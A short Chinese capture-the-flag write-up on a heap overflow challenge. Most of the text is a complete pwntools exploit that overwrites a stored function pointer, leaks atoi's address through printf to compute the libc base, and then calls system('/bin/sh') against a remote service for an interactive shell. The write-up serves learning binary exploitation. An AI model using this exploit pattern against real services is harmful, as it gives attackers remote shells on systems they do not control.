还是蛮简单的~但是我看到堆溢出就懵逼，没发现那个结构里面存了一个函数指针可以被覆盖~

总之就是覆盖函数指针----调用printf打印某函数地址继而计算libc加载地址----调用system

脚本跟z老师的几乎一样。。因为自己没思路全问他= =

```
from pwn import *
plt_printf=0x400750
got_atoi=0x602070
libc_atoi=0x39f50
libc_system=0x46640
def add():
	p.sendline('1')
	p.recvuntil(':')
	p.sendline('anything')
	p.recvuntil(':')
	p.sendline('1')
	p.recvuntil('Exit.')
	print 'add done'
def edit(id,s):
	p.sendline('3')
	p.recvuntil(':')
	p.sendline(str(id))
	p.recvuntil(':')
	p.sendline(s)
	p.recvuntil('Exit.')
	print 'edit done'
def encrypt(id):
	p.sendline('2')
	print p.recvuntil(':')
	p.sendline(str(id))
	print p.recvuntil('...')
	print 'encryption done'
#p=process('./encrypt')
p=remote('101.200.187.112','9005')
#gdb.attach(p)
p.recv()
for i in xrange(3):
	add()
edit(1,'%s\x00'+'a'*77+p64(got_atoi))
edit(2,'a'*96+p64(plt_printf))
encrypt(1)
d=p.recvuntil('\x7f')[1:].ljust(8,'\x00')
atoi=u64(d)
print '[+] atoi:'+hex(atoi)
system=atoi-libc_atoi+libc_system
print p.recvuntil('Exit.')
edit(1,'a'*96+p64(system))
edit(0,'/bin/sh\x00')
encrypt(0)
p.interactive()
```
感觉有几点需要注意的
1. 调用函数的时候用它的plt地址，而打印内存地址是用got的
2. 出现玄学bug的话就用recvuntil
3. 这串东西大概是格式化内存地址的标准代码吧，以后还可以用
```
d=p.recvuntil('\x7f')[1:].ljust(8,'\x00')
atoi=u64(d)
print '[+] atoi:'+hex(atoi)
```
感觉难度不高用时有点长啊= =
